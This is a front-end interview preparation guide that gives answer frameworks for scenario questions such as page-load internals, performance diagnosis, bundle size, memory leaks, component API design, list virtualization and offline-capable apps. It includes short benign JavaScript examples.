This is the **pure-scenario** topic — no new browser theory, just structured ways to answer the open-ended questions a front-end interview actually turns on. It assembles the whole primer into playbooks for the questions that separate offers from rejections: **"what happens when you type a URL and press enter"** (the front-end half, in depth), **"this page is slow — diagnose and fix it,"** **"cut the bundle size,"** **"there's a memory leak — find it,"** **"design this component's data flow / a reusable component API,"** **"this list is janky — make it smooth,"** and the **machine-coding / build-a-widget** round. The 16 questions here are answer *frameworks* — the order to reason in, what to say out loud, the tradeoffs to name — each one leaning on the mechanics established in the earlier topics (critical rendering path, event loop, storage, HTTP/caching, Core Web Vitals, reflow vs repaint, hydration). Treat it as the "how to perform in the room" capstone.

**Mental model**

The meta-skill these questions test is **structured reasoning under ambiguity**, and every good answer follows the same shape: **clarify → measure/observe → hypothesize → act → verify → state tradeoffs.** Interviewers are not primarily checking whether you know the one right answer; they're watching *how you think* — do you jump to a fix, or do you first ask what "slow" means and where the evidence points? So the universal move is: **never optimize or design blind.** For a perf question that means "I'd measure first — which Core Web Vital, where's the time going in the waterfall / main thread" before naming a single technique. For a design question it means "what are the requirements, the data, the constraints" before drawing an API. Then **think out loud**: narrate your hypotheses and tradeoffs so the interviewer can follow (and nudge) your reasoning. The second mental model is **breadth-then-depth**: give the full map quickly ("DNS, TLS, request, HTML parse, CRP, JS, interactive"), then dive where they steer. Showing you know the whole landscape *and* can go deep on demand is exactly the senior signal.

**Key terms**

- **Clarify-first** — open every scenario by pinning down scope/requirements/constraints before answering.
- **Measure-first** — never optimize on a guess; get the number (Web Vital, waterfall, profile) before acting.
- **LCP / INP / CLS** — the Core Web Vitals you'll be asked to diagnose and improve (loading / interactivity / stability).
- **Critical rendering path** — HTML→DOM, CSS→CSSOM, render tree → layout → paint → composite; the spine of the "type a URL" answer.
- **Main-thread budget** — the single thread running JS, layout, and paint; most jank/INP problems trace here.
- **Waterfall** — the request timing chart you read to find the loading bottleneck.
- **Virtualization / windowing** — rendering only visible list rows to keep large lists smooth.
- **Debounce vs throttle** — rate-limiting techniques for high-frequency events (input vs scroll/resize).
- **Component API design** — props/composition/state-ownership choices that make a component reusable without prop-explosion.
- **Controlled vs uncontrolled** — whether the parent owns a component's state (via props) or the component owns it internally.
- **Machine-coding round** — the live "build a working widget" exercise (typeahead, tabs, modal, todo).
- **Think out loud** — narrating hypotheses/tradeoffs so the interviewer follows your reasoning.

**Why interviewers ask this**

Scenario questions are the highest-signal part of a front-end loop because they're **unfakeable**: you can memorize what a closure is, but "here's a slow page, what do you do" reveals whether you've actually diagnosed real performance problems. The junior-vs-senior gap is stark. A junior lists techniques ("add lazy loading, use a CDN, memoize") without knowing which applies; a senior **measures first**, identifies the actual bottleneck, applies the *matching* fix, and names the tradeoff. On design questions, juniors reach for the most flexible/over-engineered API; seniors ask about requirements and pick the simplest thing that meets them, discussing state ownership and extension points. Interviewers also use these to test **communication** — a front-end engineer who can't reason out loud about a tradeoff can't collaborate on architecture. The machine-coding round adds a live-coding pressure test: can you build something small, correct, and accessible under time, while talking through your choices. These questions are where the offer is won or lost.

**Common confusions**

- "Jump straight to the fix." Naming techniques before measuring is the classic junior tell; clarify and measure first, every time.
- "There's one right answer." They want your *reasoning and tradeoffs*, not a memorized checklist.
- "More flexible API = better design." Over-engineered, prop-exploded components are a red flag; simplest-that-works wins.
- "Slow = one thing." Loading-slow (LCP/waterfall) and runtime-slow (INP/jank) are different problems with different tools; say which.
- "Optimize everything." Find the *bottleneck* and fix that; micro-optimizing the non-critical path wastes the round.
- "Silence while thinking." Not narrating loses the signal the interviewer is grading; think out loud.
- "The 'type a URL' answer is about the network only." The front-end half — parse, CRP, JS execution, interactivity — is where you show depth.

**What follows from this topic**

Nothing new follows — this is the synthesis, so it pulls *back* into everything. "Type a URL" walks the network topics (DNS/TLS/HTTP) into the critical-rendering-path and JS-engine topics. "Diagnose slow" and "fix the leak" apply the Testing & Debugging panels and the runtime-performance/Core-Web-Vitals material. "Cut the bundle" is the Architecture & Build Tooling topic in action. "Make the list smooth" is reflow/repaint, the event loop, debounce/throttle, and virtualization together. "Design the component API" leans on state-and-data-fetching and accessibility. If a scenario answer feels thin, the gap points you at the underlying topic to reinforce — this capstone is a diagnostic for the rest of the primer.

### Q1. "You type a URL and press Enter." Walk through the front-end half in depth.

Give the map, then go deep on the browser side (the network side is the Networking primer's territory — acknowledge it and move on):

**1. Network preamble (briefly):** URL parsed → **DNS** resolves the host → **TCP + TLS** handshake (or QUIC for HTTP/3) → HTTP request sent → server responds with the HTML.

**2. HTML parsing → DOM:** the browser streams the HTML and the parser builds the **DOM tree** incrementally. It doesn't wait for the whole file.

**3. Subresource discovery:** as it parses, it finds `<link rel=stylesheet>`, `<script>`, images. CSS is **render-blocking**; a synchronous `<script>` is **parser-blocking** (it pauses DOM construction until fetched+executed) — `defer`/`async`/`type=module` change that.

**4. CSSOM + render tree:** CSS is parsed into the **CSSOM**; DOM + CSSOM combine into the **render tree** (visible nodes with computed styles).

**5. Critical rendering path:** **layout/reflow** computes geometry → **paint** produces pixels → **composite** assembles layers on the GPU. First meaningful pixels appear here (FCP, then LCP for the largest element).

**6. JavaScript executes:** scripts run on the **main thread** — for an SPA/SSR app this is where the framework boots and, for SSR, **hydration** attaches listeners to server HTML (the TTI gap).

**7. Interactive:** the **event loop** now processes input; the page responds (INP measures this).

Depth signal: mention that steps 2–6 interleave (the parser, network, and main thread cooperate), that render-blocking CSS and parser-blocking JS are the levers on first paint, and that this is exactly the path LCP optimization targets.

### Q2. "This page is slow." How do you diagnose and fix it?

The whole answer is **measure first, then fix the bottleneck** — say that up front, it's the signal they want.

**1. Clarify what "slow" means.** Slow to *load* (blank/late first paint) or slow to *respond* (janky, laggy interactions)? Which page, which device/network, first visit or repeat? These point at different tools.

**2. Measure.**
- Loading-slow → **Lighthouse** for a lab overview, then the **Network waterfall** (long TTFB? a render-blocking chain? an oversized asset?) and **LCP** attribution.
- Runtime-slow → the **Performance panel**: long tasks, dropped frames, forced reflows; **INP** for interaction latency.

**3. Find the bottleneck, then apply the *matching* fix:**
- Big TTFB → server/CDN/caching (add `Cache-Control`, edge cache, faster origin).
- Render-blocking CSS/JS → inline critical CSS, `defer`/`async`, preload the LCP image.
- Huge JS bundle → code-split, tree-shake, lazy-load (the bundle-size playbook).
- Long tasks / jank → break up work, move CPU to a Web Worker, virtualize lists.
- CLS → set image/embed dimensions, reserve space.

**4. Verify** the metric improved and note the **tradeoff** (e.g. inlining critical CSS helps first paint but can't be cached separately). Refusing to name a fix before measuring is the point.

### Q3. "Cut this app's bundle size." What's your plan?

**Measure, then cut the biggest thing, then prevent regressions.**

**1. Analyze** — run a bundle analyzer for a treemap. Identify: the largest single deps, duplicated packages (two React copies), whole libraries used for one function, and code that could be deferred.

**2. Cut, in leverage order:**
- **Code-split by route** and behind interactions with dynamic `import()` — the initial chunk should hold only first-screen code.
- **Fix import shape** — `lodash/debounce` or `lodash-es`, not `import _ from 'lodash'`; per-icon imports.
- **Swap heavy deps** — `moment` → `date-fns`/`Temporal`; drop a UI kit used for 3 components.
- **Ensure tree-shaking works** — ESM deps, `sideEffects` correct, no premature transpile-to-CJS.
- **Dedupe** versions; **defer** analytics/widgets/polyfills (feature-detect).

**3. Verify and lock it in** — re-measure gzipped/brotli size on the critical path, then add a **bundle budget** (size-limit / `performance.hints: error`) to CI so the next `npm install` of something huge fails the PR.

The senior framing: JS is downloaded *and* parsed *and* executed on the main thread, so bytes cut here pay off in LCP *and* INP — it's the highest-leverage perf work, but do it by evidence (analyzer) not by guessing.

### Q4. "There's a memory leak." How do you find and fix it?

Evidence-driven, using the Memory panel — never guess.

**1. Confirm it's a leak.** Symptom is *growth over time / repeated actions*, not a slow first load. Watch the **Performance monitor** for a JS heap / DOM node / listener count that climbs and never recovers after GC.

**2. Localize with heap snapshots.** Snapshot A → repeat the suspect action ×N (open/close a modal, navigate to a route and back) → snapshot B. Compare, and **filter to detached nodes** — detached DOM elements still referenced by JS are the classic front-end leak.

**3. Follow retainers.** Select the leaked object and read the **Retainers** tree to find the exact reference keeping it alive.

**4. Fix the root cause** — almost always one of:
- an **event listener** not removed on teardown,
- a **`setInterval`/`setTimeout`** never cleared,
- a **closure** capturing a detached node,
- an **unbounded cache** (`Map`/array that only grows),
- a **subscription** (store/observer) not unsubscribed.

```javascript
// leak: listener + interval survive the component
function mount(node) {
  const id = setInterval(poll, 1000);
  window.addEventListener('resize', onResize);
  return () => { clearInterval(id); window.removeEventListener('resize', onResize); }; // cleanup
}
```

**5. Verify** — repeat the snapshot loop; heap should return to baseline after GC.

### Q5. "Design the data flow for this component / feature." How do you reason about it?

Ask requirements first, then decide **who owns which state and how data moves.**

**1. Classify the state.** The key distinction: **server state** (data fetched from an API — needs caching, revalidation, loading/error states) vs **client state** (UI state: is the menu open, form input, selected tab). They're managed differently — don't stuff server data into a global client store as if it were local.

**2. Decide ownership and location.** Keep state as **local as possible** (colocate with the component that uses it); lift it only to the nearest common ancestor when siblings must share it; reach for global/context only for truly cross-cutting state (theme, auth). Prop-drilling three levels is fine; drilling eight says "use context."

**3. Data direction.** One-way data flow: state flows **down** as props, changes flow **up** as events/callbacks. Predictable and debuggable.

**4. Server-state concerns.** Caching, **stale-while-revalidate**, dedupe concurrent requests, avoid **request waterfalls** (fetch in parallel, or lift the fetch up), optimistic updates where latency hurts. (Frameworks like React Query/SWR are examples of this pattern — name the *pattern*, not the library.)

**5. Name the tradeoff** — e.g. optimistic updates feel instant but need rollback on failure. Showing you separate server from client state is the senior signal here.

### Q6. "This list of 10,000 rows is janky." How do you make it smooth?

The root cause: rendering 10k DOM nodes blows the DOM size, layout, and memory budgets, and re-rendering/scrolling them stalls the main thread.

**1. Virtualize (windowing) — the main fix.** Render only the ~20 rows in (and just around) the viewport, absolutely positioned inside a tall spacer sized to the full list; swap row contents as the user scrolls. 10k nodes → ~30 nodes. (react-window/virtual libraries are examples; the *technique* is the point.)

```
viewport ┌──────────┐   only these rows exist in the DOM;
         │ row 118  │   a spacer div provides the full scroll height,
         │ row 119  │   rows recycle as you scroll
         │ row 120  │
         └──────────┘
```

**2. Cheapen scroll handling.** Scroll fires constantly — **throttle** work to once per frame with `requestAnimationFrame`, and mark scroll/touch listeners **`passive`** so they don't block scrolling.

**3. Avoid layout thrashing.** Don't read layout (`offsetTop`) and write style in an interleaved loop per row — batch reads then writes.

**4. Reduce per-row cost.** Memoize rows so unchanged ones don't re-render; keep row markup light; avoid per-row expensive work (heavy shadows/filters that force repaints).

**5. If filtering/sorting is slow,** debounce the input and consider doing heavy computation in a **Web Worker** off the main thread.

Verify with the Performance panel: frames back under ~16.6ms, no long tasks on scroll.

### Q7. "Design a reusable component's API." What makes a good one?

Requirements first, then design for the **simplest thing that composes well** — resist over-flexibility.

Principles to state:

- **Sensible defaults, minimal required props.** It should work with almost nothing passed; complexity is opt-in.
- **Composition over configuration.** Prefer `children`/slots over a boolean prop for every variation. Ten booleans (`isPrimary`, `hasIcon`, `isLoading`, `isCompact`...) is the smell; compound components or `children` scale better.
- **Controlled *and* uncontrolled.** Let the parent own state via `value`/`onChange` (controlled) *or* let the component manage its own with `defaultValue` (uncontrolled). Supporting both is what makes inputs reusable.
- **Predictable one-way data flow** — value in via props, changes out via callbacks.
- **Escape hatches** — forward `className`/`style`/refs and spread unknown props so consumers can extend without you anticipating every need.
- **Accessible by default** — correct roles, labels, keyboard behaviour, focus management baked in, so every consumer isn't re-solving it.

```javascript
// boolean explosion (bad) vs composition (good)
<Button isPrimary isLarge hasLeftIcon icon={<Save/>} isLoading />
<Button variant="primary" size="lg"><Save/> Save</Button>
```

Name the tradeoff: more flexibility = larger surface area to maintain and document. The senior move is asking "who uses this and how" before designing, and choosing the *smallest* API that meets it.

### Q8. Walk through a machine-coding round: build a typeahead/autocomplete.

Announce your plan before coding, build incrementally, narrate tradeoffs.

**1. Clarify** (30 seconds, but do it): remote or local data? How many results? Keyboard nav required? Debounce needed? Accessibility expectations?

**2. Skeleton first** — an input + a results list, wired to state. Get *something* rendering, then layer features.

**3. Core behaviour:**
- **Debounce** the input (~250ms) so you don't fire a request per keystroke.
- **Cancel stale requests** with `AbortController` so an earlier slow response can't overwrite a newer one (the out-of-order race is the classic bug they're watching for).
- Handle **loading / empty / error** states — not just the happy path.

```javascript
let controller;
const onInput = debounce(async (q) => {
  controller?.abort();
  controller = new AbortController();
  try {
    const res = await fetch(`/api/search?q=${encodeURIComponent(q)}`, { signal: controller.signal });
    render(await res.json());
  } catch (e) { if (e.name !== 'AbortError') showError(); }
}, 250);
```

**4. Accessibility & keyboard** — arrow keys to move the highlight, Enter to select, Escape to close; `role="combobox"`/`listbox`, `aria-activedescendant`. This is a big differentiator most candidates skip.

**5. Polish if time** — click-outside to close, highlight the matched substring, avoid re-fetching the same query.

The grading is as much *how you work* — plan, incremental commits, talking through the race condition and a11y — as the finished widget.

### Q9. How do you reason out loud effectively in a front-end interview?

The interviewer grades your *reasoning*, and silent thinking gives them nothing to grade. Structure the narration:

- **Restate and clarify.** "So it's slow on mobile, first load — is that LCP or interaction?" Shows you don't solve the wrong problem.
- **State your approach before diving.** "I'll measure first with the Network waterfall, then attribute LCP." Gives the interviewer a chance to redirect early.
- **Narrate hypotheses, not just conclusions.** "The long TTFB suggests the server or a cache miss, not the front end — let me confirm before optimizing images." They see you reason from evidence.
- **Name tradeoffs explicitly.** "Inlining critical CSS speeds first paint but that CSS can't be cached separately — worth it for above-the-fold only." This is the senior tell.
- **Signpost breadth then depth.** "There are load-time and runtime causes; I'll cover both quickly then go deep where you want."
- **Admit uncertainty honestly.** "I'm not sure of the exact INP threshold, but it's a couple hundred ms — the principle is keep interactions fast." Better than bluffing.

The anti-patterns: going silent, jumping to a fix, or reciting a memorized list without connecting it to *this* problem.

### Q10. "The page loads fast but feels sluggish to interact with." What's happening?

Loading and interactivity are **separate axes** — good load metrics (LCP/FCP) with bad **INP** points squarely at the **main thread being blocked during interactions**, not at the network.

Likely causes and the reasoning:

- **Long tasks on the main thread.** A big JS chunk parsing/executing, an expensive event handler, or heavy synchronous work means the event loop can't process input promptly — clicks/taps feel laggy. This is exactly what INP measures.
- **Hydration cost** (SSR apps). The HTML painted fast (great LCP) but the page isn't wired up until the framework hydrates — a **TTI gap** where it *looks* ready but doesn't respond.
- **Layout thrashing / forced reflow** in handlers — reading layout after writing in a loop, stalling the frame.
- **Un-throttled high-frequency handlers** (scroll/mousemove/input doing heavy work every event).

Diagnose with the **Performance panel** (record an interaction, find the long task) and INP field data. Fixes: **break up long tasks** (yield to the event loop, `scheduler.postTask`), move CPU work to a **Web Worker**, defer/reduce hydration (islands/partial hydration), debounce/throttle handlers, and code-split so less JS executes up front. The key insight to voice: *fast to look at ≠ fast to use*, and they're fixed differently.

### Q11. "Which rendering strategy would you choose for this app?" How do you answer?

Don't name one — ask what the app *needs*, then map requirements to CSR/SSR/SSG/ISR and state the tradeoff.

| Strategy | HTML made | Best for | Cost |
|---|---|---|---|
| **CSR** | In the browser | Highly interactive app behind a login (dashboard) | Slow first paint, SEO weak |
| **SSR** | Per request, server | Dynamic + SEO + fast FCP (feed, marketplace) | Server cost, **hydration** gap |
| **SSG** | At build time | Mostly-static content (docs, marketing, blog) | Rebuild to update |
| **ISR** | Build + revalidate | Large mostly-static sites needing periodic freshness | Some staleness window |

Reasoning to voice:

- **Does it need SEO / fast first paint?** → server-render (SSR/SSG), not pure CSR.
- **How dynamic / personalized is the content?** Per-user → SSR; global and rarely-changing → SSG; big but periodically-updated → ISR.
- **How interactive?** Heavy app behind auth where SEO/first-paint don't matter → CSR is simplest.

Then name the sting in the tail: **SSR/SSG need hydration**, which ships JS and creates a TTI gap where the page looks ready but isn't interactive — mitigated by **streaming SSR** and **islands/partial hydration**. Most real apps are a **mix** (static marketing pages SSG, dashboard CSR, feed SSR). Showing you'd choose *per route* by requirement is the senior answer.

### Q12. "Users report the app breaks intermittently, only sometimes." How do you approach an intermittent bug?

Intermittent = **state-, timing-, or environment-dependent**. The plan is to *make it deterministic* before fixing.

**1. Gather data on the variance.** When does it happen — after some navigation sequence, on slow networks, for certain users/data, in a specific browser? Pull error-tracking (with source maps) for stack traces and breadcrumbs; look for a common thread.

**2. Form hypotheses by category:**
- **Race conditions** — out-of-order async responses (a slow request overwriting a newer one), missing `AbortController`. Reproduce by throttling the network.
- **Timing/event-loop** — code assuming an order of microtasks/callbacks that isn't guaranteed.
- **State leakage** — a stale cache, a Service Worker serving old assets, leftover state between navigations.
- **Data-shape** — a null/empty/huge field only some users have.
- **Environment** — a specific browser/extension/locale/timezone.

**3. Reproduce deterministically** — throttle to Slow 4G, seed the exact data shape, script the navigation sequence, test the specific browser. The Network and Performance panels plus conditional breakpoints pin the trigger.

**4. Fix and verify under the triggering condition** — e.g. add request cancellation for the race, guard the null field — then confirm it holds under throttling/repetition, not just once. The signal is treating "sometimes" as a variable to control, not bad luck.

### Q13. "Walk me through optimizing LCP specifically."

LCP = time to render the **largest content element** in the viewport (hero image, headline block); target ≤2.5s. Optimize its *whole chain*, in order:

**1. Measure & identify the LCP element.** Lighthouse / the Performance panel tell you *which* element it is and where the time went (TTFB → resource load → render delay).

**2. Attack whichever segment dominates:**
- **Slow TTFB** → faster origin, CDN/edge caching, `Cache-Control`. Can't paint before the HTML arrives.
- **Late resource discovery** → **`preload`** the LCP image/font so the browser fetches it early instead of discovering it deep in parsing; `preconnect` to its origin.
- **Render-blocking CSS/JS** → inline critical CSS, `defer`/`async` scripts so first paint isn't gated.
- **Oversized LCP image** → right-sized responsive `srcset`, modern format (AVIF/WebP), and **don't lazy-load the LCP image** (a classic mistake — `loading=lazy` on the hero delays LCP).
- **Client-render delay** → if the LCP element is rendered by JS, that JS is now on the critical path → SSR/SSG it or reduce the blocking bundle.

**3. Prevent CLS while you're there** — reserve the element's space (width/height) so improving LCP doesn't trade for layout shift.

**4. Verify with field/RUM data**, not just lab — LCP is a real-user metric. The structure — *identify the element, find the slow segment, fix that segment* — is what they're grading.

### Q14. "How would you choose between debounce and throttle here?" 

Both rate-limit a high-frequency event; the choice depends on **whether you want the trailing result or a steady cadence.**

- **Debounce** — wait until the event *stops* firing for N ms, then run once. Use when you only care about the **final** state: search-as-you-type (fire the request when typing pauses), resize-end recalculation, autosave after edits stop.
- **Throttle** — run at most once per N ms **while** the event fires. Use when you want **regular updates during** a continuous stream: scroll position tracking, drag/mousemove, progress updates. Best paired with `requestAnimationFrame` so it aligns to frames.

```javascript
searchInput.addEventListener('input', debounce(fetchResults, 250));   // only the last query
window.addEventListener('scroll', throttle(updateHeader, 100), { passive: true }); // steady during scroll
```

The reasoning to voice: "Do I need the value *after activity settles* (debounce) or *steadily during activity* (throttle)?" For search, debounce — you'd waste requests otherwise. For a scroll-linked UI, throttle — debounce would make it update only when scrolling stops, which feels dead. Naming the *passive* listener for scroll is a nice extra signal.

### Q15. "Design an offline-capable / resilient front end." How do you think about it?

Requirements first — *what* must work offline (read cached content? queue writes? just fail gracefully?) — then layer the browser primitives.

**1. Cache the app shell** with a **Service Worker** — intercept requests and serve the HTML/JS/CSS shell from the **Cache API** (cache-first for the shell, so the app boots offline).

**2. Data strategy per resource:**
- **Read** — cache API responses; **stale-while-revalidate** (serve cached instantly, refresh in the background).
- **Write** — you can't reach the server offline, so **queue** mutations (in **IndexedDB**) and replay them via **Background Sync** when connectivity returns; show optimistic UI meanwhile.

**3. Store appropriately** — **IndexedDB** for structured/large offline data (async, off the critical path), not localStorage (sync, ~5MB, strings). Cache API for responses.

**4. Detect and communicate state** — `navigator.onLine` + `online`/`offline` events; show an offline banner and disable actions that truly need the network.

**5. Handle conflicts** — when queued writes replay, the server state may have changed; decide last-write-wins vs merge vs prompt.

Name the tradeoffs: Service Workers add real complexity and cache-invalidation risk (a stale SW serving old assets is a common "why won't it update" bug), and offline write-sync needs conflict handling. Scope it to what the product actually needs rather than gold-plating.

### Q16. What's your general framework for any front-end scenario question you haven't seen before?

A reusable skeleton that works whether they ask about perf, design, debugging, or architecture:

**1. Clarify.** Restate the problem and pin down scope, requirements, and constraints. "Slow on what — load or interaction? Which device?" / "This component is used where, by whom?" Never solve the wrong problem.

**2. Establish the approach — measure/observe before acting.** For perf/debugging: "I'd get evidence first — the waterfall / a profile / a heap snapshot." For design: "I'd nail requirements and data shape first." This one move separates senior from junior.

**3. Map breadth, then go deep.** Lay out the landscape quickly (the categories of cause, the options), then dive where the evidence — or the interviewer — points.

**4. Act, and connect fix to cause.** Apply the *matching* fix, not a memorized list. "The bottleneck is a long task, so I break it up / offload to a Worker" — cause → fix.

**5. State tradeoffs and verify.** Every real decision has a cost — name it ("optimistic updates need rollback"; "SSR adds hydration cost") — and say how you'd confirm it worked (metric moved, snapshot returned to baseline).

**6. Think out loud throughout.** The reasoning *is* the answer.

If you internalize just this — clarify, measure, breadth-then-depth, cause-matched fix, tradeoffs, out loud — you can handle a scenario you've never seen, which is exactly what the round tests.
